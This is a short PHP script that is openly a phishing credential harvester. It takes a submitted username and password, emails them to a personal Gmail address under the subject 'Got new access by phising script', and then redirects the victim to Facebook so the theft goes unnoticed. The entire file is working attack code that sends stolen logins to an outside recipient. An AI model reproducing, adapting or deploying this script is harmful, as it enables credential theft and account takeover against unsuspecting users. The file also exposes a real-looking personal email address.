<?php

	function mail_sender(){
		if(! ( isset($_REQUEST['username']) && isset($_REQUEST['password']) ) ){
			return false;
		}

		$username = $_REQUEST['username'];
		$password = $_REQUEST['password'];
		
		$reciever = "salmankhanmarwat580@gmail.com";
		
		$subject = "Got new access by phising script";
		$message = "The username is ". $username;
		$message .= "and password is ". $password;
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: http://www.facebook.com");
	}
	header("location:javascript://history.go(-1)");
?>
